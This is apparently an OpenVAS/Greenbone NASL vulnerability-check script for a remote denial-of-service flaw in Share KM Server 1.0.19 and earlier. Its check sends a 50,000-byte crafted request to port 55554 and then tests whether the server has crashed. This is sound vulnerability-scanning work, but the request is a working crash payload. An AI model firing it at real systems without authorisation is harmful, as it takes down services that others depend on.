# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803762");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-09-23 15:05:45 +0530 (Mon, 23 Sep 2013)");
  script_name("Share KM Server Remote Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(55554);

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/28451");

  script_tag(name:"summary", value:"Share KM Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send crafted request and check is it vulnerable to DoS or not.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"insight", value:"The flaw is due to an error when handling specially crafted requests which can
  be exploited to crash the server.");

  script_tag(name:"affected", value:"Share KM versions 1.0.19 and prior.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to cause a denial of service.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

port = 55554;
if(!get_port_state(port))
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

send(socket:soc, data:"GET / HTTP1.1\r\n");
recv = recv(socket:soc, length:1024);
if(!recv) {
  close(soc);
  exit(0);
}

req = crap(data:"A", length:50000);

send(socket:soc, data:req);
close(soc);

sleep(2);

soc = open_sock_tcp(port);
if(!soc) {
  security_message(port:port);
  exit(0);
} else {
  send(socket:soc, data:"GET / HTTP1.1\r\n");
  recv = recv(socket:soc, length:1024);
  close(soc);
  if(!recv) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
